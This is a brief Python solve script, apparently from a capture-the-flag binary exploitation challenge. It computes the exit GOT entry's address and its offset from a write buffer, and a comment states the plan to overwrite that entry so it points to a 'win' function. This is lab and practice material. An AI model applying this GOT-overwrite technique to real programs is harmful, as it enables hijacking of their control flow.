
import sys


if (len(sys.argv) != 3):
    print("Syntax: solve.py <flag address> <io write start address>")
    exit(0)
exit_got_offset = 0x3468
win_offset = 0x1229
write_start_offset = 0x555555558484- 0x555555555000

winaddr = int(sys.argv[1],16)
exit_addr = winaddr-win_offset + exit_got_offset
start_addr = int(sys.argv[2],16)
print("Win addr:",hex(winaddr))
print("Exit addr:",hex(exit_addr))
print("Start addr:",hex(start_addr))

pos = exit_addr - start_addr
print("Position: ",pos)
# We will overwrite exit GOT to point to win